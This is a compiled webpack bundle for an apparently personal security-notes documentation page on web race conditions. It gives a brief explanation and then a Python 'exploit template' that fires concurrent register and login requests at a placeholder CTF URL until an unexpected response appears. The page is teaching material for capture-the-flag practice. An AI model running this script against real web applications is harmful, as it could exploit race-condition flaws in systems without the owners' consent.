"use strict";(self.webpackChunk_2h3ph3rd_github_io=self.webpackChunk_2h3ph3rd_github_io||[]).push([[1389],{4412:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>a,default:()=>u,frontMatter:()=>o,metadata:()=>i,toc:()=>d});var s=t(4848),r=t(8453);const o={},a="\ud83c\udfc1 Race conditions",i={id:"security/web/race-conditions",title:"\ud83c\udfc1 Race conditions",description:"A race condition happens when concurrent calls lead to a not wanted status of the system.",source:"@site/docs/security/05-web/race-conditions.md",sourceDirName:"security/05-web",slug:"/security/web/race-conditions",permalink:"/docs/security/web/race-conditions",draft:!1,unlisted:!1,editUrl:"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/security/05-web/race-conditions.md",tags:[],version:"current",frontMatter:{},sidebar:"securitySidebar",previous:{title:"\ud83d\udcee Proxy",permalink:"/docs/security/web/proxy"},next:{title:"\ud83d\udce9 Serialization",permalink:"/docs/security/web/serialization"}},c={},d=[{value:"Exploit template",id:"exploit-template",level:2}];function l(e){const n={code:"code",h1:"h1",h2:"h2",p:"p",pre:"pre",...(0,r.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.h1,{id:"-race-conditions",children:"\ud83c\udfc1 Race conditions"}),"\n",(0,s.jsx)(n.p,{children:"A race condition happens when concurrent calls lead to a not wanted status of the system.\nThis can occur in web app because they are thought for multiple user access at the same time."}),"\n",(0,s.jsx)(n.p,{children:"For example, consider two users that want to modify the same value.\nThey interact with the server and ask to it in parallel for two different changes.\nNo synchronization between calls, no transactions for read and write or whatever multithreads control system is implemented."}),"\n",(0,s.jsx)("p",{align:"center",children:(0,s.jsx)("img",{src:t(6998).A})}),"\n",(0,s.jsx)(n.h2,{id:"exploit-template",children:"Exploit template"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-py",children:'#!/usr/bin/env python3\n\nimport random\nimport string\nimport requests\nimport threading\nimport time\n\n# change this value with the base url like "https://challenge.pwn"\nURL = "URL"\n\n# very simple way for multithread communication\n# remember to use `global found`\nfound = False\n\n\ndef register(session, username, password):\n    url = "%s/register" % URL\n    payload = {"username": username, "password": password}\n    r = session.post(url, data=payload)\n    return r.text\n\n\ndef login(session, username, password):\n    # import global found to communicate with the main thread\n    global found\n\n    url = "%s/login" % URL\n    payload = {"username": username, "password": password}\n    r = session.post(url, data=payload)\n\n    # check for flag and print output\n    if "flag" not in r.text:\n        print(r.text)\n        found = True\n\n    return r.text\n\n\ndef random_string():\n    k = random.randint(6, 15)\n    allowed_chars = string.ascii_lowercase + string.digits\n    return "".join(random.choices(allowed_chars, k=k))\n\n\n# test calls\n\nsession = requests.Session()\nusername = random_string()\npassword = random_string()\n\nres = register(session, username, password)\nassert "success" in res\n\nres = login(session, username, password)\nassert "success" in res\n\n# start exploit\n\nwhile not found:\n    session = requests.Session()\n    username = random_string()\n    password = random_string()\n\n    t_register = threading.Thread(target=register,\n        args=(session, username, password))\n    t_register.start()\n\n    # sometimes, a small delay between calls could be needed\n    k = random.random() / 10\n    time.sleep(k)\n\n    t_login = threading.Thread(target=login,\n        args=(session, username, password))\n    t_login.start()\n\n    # wait for the last thread to finish\n    t_login.join(timeout=1)\n'})})]})}function u(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(l,{...e})}):l(e)}},6998:(e,n,t)=>{t.d(n,{A:()=>s});const s=t.p+"assets/images/race_condition-a64c8b3cc6421ae69c9889efcd349580.jpg"},8453:(e,n,t)=>{t.d(n,{R:()=>a,x:()=>i});var s=t(6540);const r={},o=s.createContext(r);function a(e){const n=s.useContext(o);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function i(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:a(e.components),s.createElement(o.Provider,{value:n},e.children)}}}]);